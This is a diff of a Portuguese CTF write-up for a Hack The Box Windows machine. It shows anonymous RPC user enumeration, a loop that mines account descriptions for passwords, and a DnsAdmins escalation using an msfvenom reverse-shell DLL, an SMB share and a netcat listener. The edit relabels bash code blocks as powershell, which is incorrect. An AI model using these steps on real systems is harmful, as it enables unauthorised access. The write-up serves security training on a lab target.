@@ -29,7 +29,7 @@ A primeira fase de todo e qualquer PenTesting é a fase de enumeração. Para is
 
 Montes de portas para esta máquina! Ainda nunca me lembrei de falar de uma função que tenho definida a nível de zshrc. Para quem segue o S4vitar, sabe certamente da sua utilidade **_"exctractports"_** (Atenção à prenuncia: igzxtráááááctPóórt). E para quem não conhece, recomendo vivamente!! (https://www.youtube.com/channel/UCNHWpNqiM8yOQcHXtsluD7Q). Alterei um pouco a função dele para se adequar ao meu ambiente WSL2 e para copiar para clipboard não só as portas, mas também o "nmap <IP> -p<Portas>" e a seguir é que ponho manualmente os parâmetros que quero.
 
-```bash
+```powershell
 extractPorts () {
 	reset="\e[0m"
 	amarelo="\e[1;33m"
@@ -131,13 +131,13 @@ Com outras ferramentas como smbclient ou smbmap também não se pode enumerar na
 
 Com **"rpcclient"** a coisa é diferente. Já se pode entrar em modo anónimo com usuário "" (vazio)
 
-```bash
+```powershell
 rpcclient -U '' 10.10.10.169 -N
 ```
 
 Desta forma entramos em modo interativo e é possível introduzir comandos, tendo neste caso respostas. Mas esta ferramenta também pode ser usada com o parametro "-c" que nos permite enviar o commando, e obter resposta em output normal.
 
-```bash
+```powershell
 rpcclient -U '' 10.10.10.169 -N -c 'enumdomusers'
 #>  user:[Administrator] rid:[0x1f4]
 #>  user:[Guest] rid:[0x1f5]
@@ -172,13 +172,13 @@ Desta forma, podemos filtar o output, exportar para ficheiro e tal, como qualque
 
 A primeira a coisa a fazer é gravar para um ficheiro todos os usernames
 
-```bash
+```powershell
 rpcclient -U '' 10.10.10.169 -N -c 'enumdomusers' | awk '{print $1}' | grep -oP '\[.*?\]' | tr -d "[]" > contents/users
 ```
 
 Depois disso, podemos extrair mais informações. O RPC funciona com queries ao rid e não ao username.
 
-```bash
+```powershell
 rpcclient -U '' 10.10.10.169 -N -c 'enumdomusers' | awk '{print $2}' | grep -oP '\[.*?\]' | tr -d "[]" | xargs
 #> 0x1f4 0x1f5 0x1f6 0x1f7 0x451 0x457 0x19c9 0x19ca 0x19cb 0x19cc 0x19cd 0x19ce 0x19cf 0x19d0 0x19d1 0x19d2 0x19d3 0x19d4 0x19d5 0x19d6 0x19d7 0x19d8 0x19d9 0x2775 0x2776 0x2777 0x2778
 ```
@@ -187,7 +187,7 @@ Com todos os rids, podemos pedir detalhes de cada um e filtrar apenas os campos 
 
 O que nos interessa por enquanto é obter informações básica. Queremos saber os nomes de usuários, e se o mesmo foi criado com alguma descrição que possamos usar no futuro. Em empresas, é comum mencionar dados sensíveis no campo de descrição quando o administrador cria um novo usuário (password por defeito, função, email, contacto telefónico...). É claro que, para um CaptureTheFlag, o número de telefone não me é muito util (provavelmente ser um fictício lol), mas uma palavra passe dá sempre jeito =).
 
-```bash
+```powershell
 for rid in $(rpcclient -U '' 10.10.10.169 -N -c 'enumdomusers' | awk '{print $2}' | grep -oP '\[.*?\]' | tr -d "[]"); do echo; rpcclient -U '' 10.10.10.169 -N -c "queryuser $rid" | grep -E "User Name|Description"; done
 
 #>          User Name   :   Administrator
@@ -300,14 +300,14 @@ Este group permite aos seus membros configurar, iniciar, e parar o serviço dns 
 
 ## Criação do ficheiro.dll malicioso
 
-```bash
+```powershell
 [Environment]::Is64BitOperatingSystem
 #>  True
 ```
 
 A máquina é de 64 bits, portanto o reverse shell terá de 64 bits
 
-```bash
+```powershell
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.12 LPORT=443 -f dll -o rev.dll
 ```
 
@@ -317,7 +317,7 @@ Iremos agora transferir o ficheiro para a máquina alvo com, por exemplo, certut
 
 OH SHIT! O antivírus está ativo... Temos 2 soluções, ou ofuscar o código (que pode levar alguma tentativas porque não fica um ficheiro limpo) ou partilhar um servidor Samba, porque o dll malicioso pode ser chamado a partir de fora da máquina alvo!
 
-```bash
+```powershell
 sudo smbserver.py smbFolder $(pwd) -smb2support  # o reverse shell tem de se encontrar na pasta onde se executa o commando
 
 sudo rlwrap nc -lvnp 443
